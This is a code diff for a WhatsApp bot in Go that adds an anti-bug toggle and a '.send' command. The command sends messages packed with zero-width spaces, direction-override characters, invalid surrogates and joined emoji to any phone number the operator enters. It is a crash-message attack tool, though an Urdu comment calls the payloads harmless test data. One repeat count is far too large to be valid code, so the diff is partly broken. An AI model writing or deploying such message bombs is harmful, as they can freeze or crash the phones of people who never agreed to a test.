@@ -714,3 +714,106 @@ func handleGroupInfoChange(client *whatsmeow.Client, v *events.GroupInfo) {
 		}
 	}
 }
+
+//bug 🪲 🐛 menu
+
+var badChars = []string{
+	"\u200b", // Zero Width Space (Type 1)
+	"\u202e", // Right-To-Left Override (Type 2)
+	"\u202d", // Left-To-Right Override (Type 2)
+	"\u2060", // Word Joiner (Type 3)
+	"\u200f", // RTL Mark (Type 3)
+}
+
+func handleAntiBug(client *whatsmeow.Client, v *events.Message) {
+	// اسٹیٹس چینج کریں
+	AntiBugEnabled = !AntiBugEnabled
+	
+	statusText := "OFF ❌"
+	if AntiBugEnabled {
+		statusText = "ON ✅"
+	}
+
+	reply := fmt.Sprintf("🛡️ *Anti-Bug System*\n\nCurrent Status: %s", statusText)
+	
+	// جواب بھیجیں
+	client.SendMessage(context.Background(), v.Info.Chat, &waProto.Message{
+		Conversation: proto.String(reply),
+	})
+}
+
+func handleSendBug(client *whatsmeow.Client, v *events.Message, args []string) {
+	// چیک کریں کہ آرگیومنٹس پورے ہیں (کم از کم ٹائپ اور نمبر)
+	if len(args) < 2 {
+		client.SendMessage(context.Background(), v.Info.Chat, &waProto.Message{
+			Conversation: proto.String("⚠️ Usage: .send <type> <number>\nTypes: 1, 2, 3, all"),
+		})
+		return
+	}
+
+	bugType := strings.ToLower(args[0]) // 1, 2, 3, or all
+	targetNum := args[1]
+
+	// نمبر فارمیٹنگ
+	if !strings.Contains(targetNum, "@s.whatsapp.net") {
+		targetNum = targetNum + "@s.whatsapp.net"
+	}
+	jid, err := types.ParseJID(targetNum)
+	if err != nil {
+		fmt.Println("Invalid Number:", err)
+		return
+	}
+
+	// --- Payloads کی تیاری ---
+	// نوٹ: یہ اصلی وائرس نہیں ہیں، صرف ٹیسٹنگ کے لیے موک (Mock) ڈیٹا ہے۔
+	
+	// Payload 1: Zero Width Spaces (عام طریقہ)
+	payload1 := strings.Repeat("\u200b", 80)
+
+	// Payload 2: Right-to-Left Overrides (ٹیکسٹ ڈائریکشن بگز)
+	payload2 := strings.Repeat("\u202e|\u202d|\u202a|\u202b|\u202c|\u202e\u202d|\u202d\u202e|\u202e\u202e|\u202d\u202d|\u202e\u200b|\u202e\u200d|\u202d\u200b|\u202d\u200d|\u202e\u200b\u200d|\u200b|\u200c|\u200d|\u200b\u200b|\u200d\u200d|\u200b\u200c\u200d|\ufeff|\ufeff\ufeff|\ufeff\u200b|\u2066|\u2067|\u2068|\u2069|\u2066\u2067|\u2067\u2069|\u2066\u202e|\u0300|\u0301|\u0302|\u0300\u0300|\u0301\u0301|\u0300\u0301|\u0336|\u0336\u0336|\u034f|\u034f\u034f|\ud800|\udfff|\ud800\ud800|\udfff\udfff|\uffff|\ufffe|\ufdd0|\ufdef|👨‍👩‍👧‍👦|🏳️‍🌈|👩‍❤️‍💋‍👨|👨‍👨‍👧‍👦", 50000000000000000000)
+
+	// Payload 3: Word Joiners & Marks (مکسچر)
+	payload3 := strings.Repeat("\u2060\u200f", 40)
+
+	var finalMessage string
+	var label string
+
+	switch bugType {
+	case "1":
+		label = "Type 1 (Hidden Spaces)"
+		finalMessage = "🚨 *TEST BUG 1* 🚨\n" + payload1 + "\nEnd of Test 1"
+	case "2":
+		label = "Type 2 (Direction Overrides)"
+		finalMessage = "🚨 *TEST BUG 2* 🚨\n" + payload2 + "\nEnd of Test 2"
+	case "3":
+		label = "Type 3 (Mixed Junk)"
+		finalMessage = "🚨 *TEST BUG 3* 🚨\n" + payload3 + "\nEnd of Test 3"
+	case "all":
+		label = "ALL TYPES (Mega Test)"
+		// سب کو ملا کر ایک ہیوی ٹیسٹ، لیکن اتنا نہیں کہ موبائل پھنس جائے
+		finalMessage = "🚨 *MEGA TEST BUG* 🚨\n" + payload1 + payload2 + payload3 + "\nChecking detection for ALL types."
+	default:
+		client.SendMessage(context.Background(), v.Info.Chat, &waProto.Message{
+			Conversation: proto.String("❌ Invalid Type. Use 1, 2, 3 or all"),
+		})
+		return
+	}
+
+	// میسج بھیجنا
+	resp, err := client.SendMessage(context.Background(), jid, &waProto.Message{
+		Conversation: proto.String(finalMessage),
+	})
+
+	if err != nil {
+		fmt.Println("Error sending:", err)
+		client.SendMessage(context.Background(), v.Info.Chat, &waProto.Message{
+			Conversation: proto.String("❌ Failed to send."),
+		})
+	} else {
+		fmt.Printf("Sent %s to %s (ID: %s)\n", label, targetNum, resp.ID)
+		client.SendMessage(context.Background(), v.Info.Chat, &waProto.Message{
+			Conversation: proto.String("✅ Sent: " + label + "\nWatch if Anti-Bug deletes it."),
+		})
+	}
+}
